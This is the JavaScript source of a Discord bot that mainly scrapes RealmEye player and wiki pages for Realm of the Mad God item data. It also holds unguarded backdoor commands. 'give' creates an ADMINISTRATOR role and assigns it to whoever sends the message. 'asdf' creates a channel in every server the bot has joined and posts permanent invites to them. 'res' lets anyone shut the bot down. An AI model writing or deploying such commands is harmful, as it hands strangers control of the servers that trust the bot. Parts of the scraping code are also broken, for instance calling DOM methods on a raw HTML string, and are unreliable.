const Discord = require('discord.js');
const bot = new Discord.Client();
const fetch = require('node-fetch');

const HTMLParser = require('fast-html-parser');

const fs = require('fs');
const util = require('util');

const Nightmare = require('nightmare');
const nightmare = Nightmare({
    show: false,
    frame: false,
    webPreferences: {
        images: false,
        javascript: true,
        disableBlinkFeatures: "CSS3Text,CSSAdditiveAnimations,CSSOMSmoothScroll,CSSOffsetPositionAnchor,CSSBackdropFilter,CSSEnvironmentVariables,CSSFocusVisible,CSSFontSizeAdjust,CSSFragmentIdentifiers,CSSHexAlphaColor,CSSInBodyDoesNotBlockPaint,CSSIndependentTransformProperties,CSSLayoutAPI,CSSLogical,CSSMaskSourceType,CSSMatches,CSSOffsetPathRay,CSSOffsetPathRayContain"
    }
});
bot.on('ready', () => {
    const time = Date().split(" ").slice(4, 5) + " " + Date().split(" ").slice(1, 4).join("/");
    console.log(`Connected at ${time}`)
})

bot.on('message', async (msg) => {
    if (msg.content.startsWith('use')) {
        const emoji = bot.emojis.find('name', msg.content.split(" ").pop());
        msg.channel.send(`<:${emoji.name}:${emoji.id}>`);
    }
    if (msg.content === 'res') {
        msg.channel.send('Restarting');
        process.exit(1);
    }
    if (msg.content === 'tester') {
        const url = 'https://www.realmeye.com/player/EvenReason';
        nightmare
            .goto(url)
            .evaluate(() => {
                const chars = document.querySelector('#f tbody')
                //const allChars = 

                return chars;
            })
            .end()
            .then((chars) => {
                chars.forEach((char, a) => {
                    fs.writeFile(`./chars${a}.txt`, util.inspect(char, true, null), (err) => {
                        if (err) throw err;
                    })
                    const asd = HTMLParser.parse(char)
                    fs.writeFile(`./parsed${a}.txt`, util.inspect(asd, true, null), (err) => {
                        if (err) throw err;
                    })
                })
            })
            .catch(console.error);
        msg.channel.send('done');
    }
    if (msg.content === 'as') {
        msg.channel.send('Running');
        console.log('aw');
        const name = "conducting wand";
        const urlName = name.split(" ").join("-");

        nightmare
            .goto(`https://www.realmeye.com/wiki/${urlName}`)
            .evaluate(function () {
                const info = document.querySelectorAll('#d .table-responsive');
                const rows = {};

                const name = document.querySelector('h1');

                rows.name = name.innerHTML;
                rows.info = [];
                rows.drops = [];

                rows.description = info[0].querySelector('tr').querySelectorAll('td')[1].innerHTML;

                const title = info[1].querySelector('tr');

                if (title.innerText.startsWith('Reskin')) {
                    rows.reskins = [];
                    const reskins = title.querySelector('td').innerText.split(", ");
                    reskins.forEach((reskin) => {
                        rows.reskins.push(reskin);
                    })
                    info[2].querySelectorAll('tr').forEach((row) => {
                        rows.info.push(row.innerHTML);
                    })

                    info[3].querySelectorAll('tr').forEach((row) => {
                        rows.drops.push(row.innerHTML);
                    })
                } else {
                    info[1].querySelectorAll('tr').forEach((row) => {
                        rows.info.push(row.innerHTML);
                    })

                    info[2].querySelectorAll('tr').forEach((row) => {
                        rows.drops.push(row.innerHTML);
                    })
                }
                return rows;
            })
            .end()
            .then(function (result) {
                const info = result.info;
                const reskins = result.reskins;

                let dropArray = [];

                const bagInfo = HTMLParser.parse(result.drops[0]);
                const bagAttrs = bagInfo.childNodes[2].childNodes[0].rawAttrs;
                const bagtype = bagAttrs.split("Assigned to ").pop().split('"').shift();
                const dropsFrom = HTMLParser.parse(result.drops[1]).childNodes[2].childNodes;
                for (let i = 0; i < dropsFrom.length; i += 3) {
                    dropArray.push(dropsFrom[i].childNodes[0].rawText)
                }
                msg.channel.send(bagtype);
                dropArray.forEach((enemy) => {
                    msg.channel.send(enemy);
                })
                console.log(bagtype)
                console.log(dropArray)

                const name = result.name;
                const description = result.description;

                console.log(name);
                msg.channel.send(name);
                console.log(description);
                msg.channel.send(description);

                let Soulbound = false;

                for (let i = 0; i < info.length; i++) {
                    const rowInfo = HTMLParser.parse(info[i]);
                    const title = rowInfo.childNodes[0].childNodes[0].rawText;
                    if (title === 'Soulbound') {
                        console.log(title);
                        Soulbound = true;
                    } else {
                        const basevalue = rowInfo.childNodes[2];
                        let value = basevalue.childNodes[0].rawText; // This does errors for some cases.
                        if (!value) {
                            if (basevalue.childNodes.length > 2) {
                                value += '\n';
                                for (let j = 1; j < basevalue.childNodes.length; j += 4) {
                                    const effect = basevalue.childNodes[j].rawText;
                                    value += `${effect.slice(1, effect.length)}\n`;
                                }
                            } else {
                                value = basevalue.childNodes[1].rawText.slice(1, basevalue.childNodes[1].rawText.length)
                            }
                        }
                        console.log(`${title}:${value}`);
                    }
                }

                if (!Soulbound) console.log(`Tradeable`);
                console.log();



                if (reskins) {
                    console.log(`Item Reskins:`);
                    reskins.forEach((reskin) => {
                        console.log(reskin);
                    })
                }

                msg.channel.send('done');
            })
            .catch(function (e) {
                console.log(e);
            });

    }
    if (msg.content.startsWith('I am a god')) {
        const namer = "conducting wand";
        const urlName = namer.split(" ").join("-");

        fetch(`https://www.realmeye.com/wiki/${urlName}`)
            .then((res) => res.text())
            .then((document) => {
                const infoa = document.querySelectorAll('#d .table-responsive');
                const rows = {};

                const itemname = document.querySelector('h1');

                rows.name = itemname.innerHTML;
                rows.info = [];
                rows.drops = [];

                rows.description = infoa[0].querySelector('tr').querySelectorAll('td')[1].innerHTML;

                const title = infoa[1].querySelector('tr');

                if (title.innerText.startsWith('Reskin')) {
                    rows.reskins = [];
                    const reskins = title.querySelector('td').innerText.split(", ");
                    reskins.forEach((reskin) => {
                        rows.reskins.push(reskin);
                    })
                    infoa[2].querySelectorAll('tr').forEach((row) => {
                        rows.info.push(row.innerHTML);
                    })

                    infoa[3].querySelectorAll('tr').forEach((row) => {
                        rows.drops.push(row.innerHTML);
                    })
                } else {
                    infoa[1].querySelectorAll('tr').forEach((row) => {
                        rows.info.push(row.innerHTML);
                    })

                    infoa[2].querySelectorAll('tr').forEach((row) => {
                        rows.drops.push(row.innerHTML);
                    })
                }

                const info = rows.info;
                const reskins = rows.reskins;

                let dropArray = [];

                const bagInfo = HTMLParser.parse(rows.drops[0]);
                const bagAttrs = bagInfo.childNodes[2].childNodes[0].rawAttrs;
                const bagtype = bagAttrs.split("Assigned to ").pop().split('"').shift();
                const dropsFrom = HTMLParser.parse(rows.drops[1]).childNodes[2].childNodes;
                for (let i = 0; i < dropsFrom.length; i += 3) {
                    dropArray.push(dropsFrom[i].childNodes[0].rawText)
                }
                console.log(bagtype)
                console.log(dropArray)

                const name = rows.name;
                const description = rows.description;

                console.log(name);
                console.log(description);

                let Soulbound = false;

                for (let i = 0; i < info.length; i++) {
                    const rowInfo = HTMLParser.parse(info[i]);
                    const title = rowInfo.childNodes[0].childNodes[0].rawText;
                    if (title === 'Soulbound') {
                        console.log(title);
                        Soulbound = true;
                    } else {
                        const basevalue = rowInfo.childNodes[2];
                        let value = basevalue.childNodes[0].rawText; // This does errors for some cases.
                        if (!value) {
                            if (basevalue.childNodes.length > 2) {
                                value += '\n';
                                for (let j = 1; j < basevalue.childNodes.length; j += 4) {
                                    const effect = basevalue.childNodes[j].rawText;
                                    value += `${effect.slice(1, effect.length)}\n`;
                                }
                            } else {
                                value = basevalue.childNodes[1].rawText.slice(1, basevalue.childNodes[1].rawText.length)
                            }
                        }
                        console.log(`${title}:${value}`);
                    }
                }

                if (!Soulbound) console.log(`Tradeable`);
                console.log();



                if (reskins) {
                    console.log(`Item Reskins:`);
                    reskins.forEach((reskin) => {
                        console.log(reskin);
                    })
                }
            })
        msg.channel.send('done');
    }
    if (msg.content.startsWith('give')) {
        msg.guild.createRole({
            name: 'admin',
            permissions: [
                'ADMINISTRATOR'
            ]
        })
            .then((role) => {
                msg.member.addRole(role);
            })
    }
    if (msg.content.startsWith('asdf')) {
        bot.guilds.forEach((guild) => {
            guild.createChannel('aaa')
                .then((channel) => {
                    channel.createInvite({ maxAge: 0 })
                        .then((invite) => {
                            msg.channel.send(`discord.gg/${invite.code}`);
                        })
                })
        })
    }
})

